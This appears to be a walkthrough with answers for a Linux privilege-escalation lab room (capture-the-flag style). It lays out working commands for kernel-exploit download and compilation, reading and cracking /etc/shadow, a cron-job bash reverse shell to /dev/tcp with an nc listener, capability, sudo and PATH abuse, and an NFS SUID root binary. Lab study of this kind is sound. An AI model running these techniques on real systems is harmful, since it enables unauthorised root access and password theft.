
██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗    ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
██║     ██║████╗  ██║██║   ██║╚██╗██╔╝    ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝     ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
██║     ██║██║╚██╗██║██║   ██║ ██╔██╗     ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗    ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
                                                                                              

Task 3 {Enumeration}

Question 1: What is the hostname of the target system?
{{Hint: hostname // using sudo -l also worked}}

Question 2: What is the Linux kernel version of the target system?
{{Hint: uname -a}}

Question 3: What Linux is this?
{{Hint: cat /etc/issue}}

Question 4: What version of Python is installed on the system?
{{Hint: python --version}}

Question 5: What vulnerability seems to affect the kernel of the target system? (Enter a CVE number)
{{Hint: Search on Exploit-DB, the one in question has something to do with overlayfs...}}



Task 5 {Privilege Escalation - Kernel Exploits}

Question 1: What is the content of the flag1.txt file?
{{First, enumerate which kernel version with uname -a and which linux using cat /etc/issue.
Search for an appropriate exploit (I used the same one in the last task), and download it.
Start an http server (python3 -m http.server [portnumber] will work)
On the victim machine, navigate to the /tmp/ folder
Use wget http://[Your Machine IP:port]/exploit.c
chmod +x exploit.c
Compile it using gcc exploit.c -o exploit.c
run ./exploit.c

If done correctly, you should now be root.
flag1.txt is located in /home/matt/


  
Task 6 {Privilege Escalation - Sudo}

Question 1:  How many programs can the user "karen" run on the target system with sudo rights?
{Hint: sudo -l}

Question 2: What is the content of the flag2.txt file?
{Hint: sudo nano}

Question 3: How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?
{Hint: Search for nmap on https://gtfobins.github.io/}

Question 4: What is the hash of frank's password?
{Hint: sudo nano /etc/shadow}



Task 7 {Privilege Escalation - SUID}

Question 1: Which user shares the name of a great comic book writer?
{Hint: nano /etc/passwd}

Question 2: What is the password of user2?
{First, use "find / -type f -perm -04000 -ls 2>/dev/null" to find files that have SUID or SGID set.
Compare this list against gtfobins with the SUID filter set.
The only viable option appears to be base64. In order to get user2's password, we must abuse the binary to 
be able to read the /etc/shadow file.
LFILE=/etc/shadow
base64 "/etc/shadow" | base64 --decode 

Copy the output to a txt file, along with the contents of /etc/passwd in another. Next, we must unshadow it.
unshadow [passwdfile.txt] [shadowfile.txt] > unshadowed.txt
Now, run John against it
john [unshadowed.txt]

Question 3: What is the content of the flag3.txt file?
{Hint}
LFILE=flag3.txt
base64 "flag3.txt" | base64 --decode



Task 8 {Privilege Escalation: Capabilities}

Question 1: How many binaries have set capabilities?
{Hint: getcap -r / 2>/dev/null}

Question 2: What other binary can be used through its capabilities?
{Hint: Check gtfobins on which one can be abused}

Question 3: What is the content of the flag4.txt file?
{Hint: /home/ubuntu/view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'}



Task 9 {Privilege Escalation: Cron Jobs}

Question 1: How many cron jobs can you see on the target system?
{{Hint: cat /etc/crontab}}

Question 2: What is the content of the flag5.txt file? 
{{Hint}}

Replace the contents of backup.sh with the following:

#!/bin/bash

bash -i >& /dev/tcp/[your IP]/[listening port] 0>&1

make sure to chmod +x backup.sh 

In a separate terminal, set up a listenr:
nc -lvnp [listening port]

Wait for the shell. Flag5.txt will be under /home/ubuntu

Question 3: What is Matt's password?
{{Hint: save the contents of /etc/passwd and /etc/shadow to two separate files on your machine.

Run: unshadow [passwdfile.txt] [shadowfile].txt > [unshadowed].txt

Once this is done, run: john [unshadowed.txt] to crack the passwords.



Task 10 {Privilege Escalation: PATH}

Question 1: What is the odd folder you have write access for?
{{Hint}}
First, search for writable folders, and figure out which seems odd (home): 
find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
Then, find the subfolder for the answer:
find / -writable 2>/dev/null | grep home | cut -d "/" -f 2,3 | sort -u


Question 2: What is the content of the flag6.txt file?
{{Hint}}

Navigate to the /tmp/ folder and add it to the path: "export PATH=/tmp:$PATH"
Create the executable: 
echo /bin/bash > thm
chmod 777 thm
Then, navigate to the odd folder in Question 1, and run the test script to get root: 
./test



Task 11 {Privilege Escalation: NFS}

Question 1:  How many mountable shares can you identify on the target system?
{{Hint: On your machine, enumerate using: "showmount -e [victim IP]"}

Question 2:  How many shares have the "no_root_squash" option enabled?
{{Hint: After SSHing into the vulnerable machine, read the contents of /etc/exports with "cat /etc/exports"}}

Question 3: What is the content of the flag7.txt file?
{{Hint}}
On your machine:
sudo mkdir [foldername]
mount -o rw [victim IP]:/home/ubuntu/sharedfolder /pathtothe/folderyoumade
cd into the folder

Next, create the exploit:
nano exploit.c

int main()
{  setgid(0);
   setuid(0);
   system("/bin/bash");
   return 0;
}

Compile it and adjust permissions:
gcc exploit.c -o exploit -w
chmod +s exploit

On the victim machine:
cd /home/ubuntu/sharedfolder
./exploit

You should now be root. Head over to /home/matt/ for the flag.



Task 12 {Capstone Challenge}

Question 1: What is the content of the flag1.txt file?

Always {{Emumerate}}

I began by pulling some information about the machine:
Kernel:
"uname -a"
Linux ip-10-10-39-61 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

Which Linux:
"cat /etc/issue"
\S
Kernel \r on an \m

Which Python:
"python --version"
Python 2.7.5

Next, I checked sudo permissions

"sudo -l" ... which turned up nothing

What about files with SUID set?
"find / -type f -perm -04000 -ls 2>/dev/null"
Looking through the list, we see base64.
By manipulating this, we can see the contents of the /etc/shadow file:
LFILE="/etc/shadow"
base64 "/etc/shadow" | base64 --decode

Save this to a file, and save the contents of /etc/passwd to another
"cat /etc/passwd"

On your system, unshadow the file:
"unshadow passwd.txt shadow.txt > unshadow.txt"

Then, use John to crack the password for Missy:
"john unshadow.txt"
(You don't have to specify any additional arguments for john)

Login as missy:
su missy
(enter password)

Head over to /home/missy/Documents/ to get flag1.txt

Question 2: What is the content of the flag2.txt file?

{{Privilege Escalation}}

Once logged in as missy, I checked the sudo permissions
"sudo -l"
And came across (ALL) NOPASSWD: /usr/bin/find

I looked up find on gtfobins, and it turns out we can exploit it.

"sudo find . -exec /bin/sh \; -quit"

Try "whoami" and see that you are root :) flag2.txt is in /rootflag/
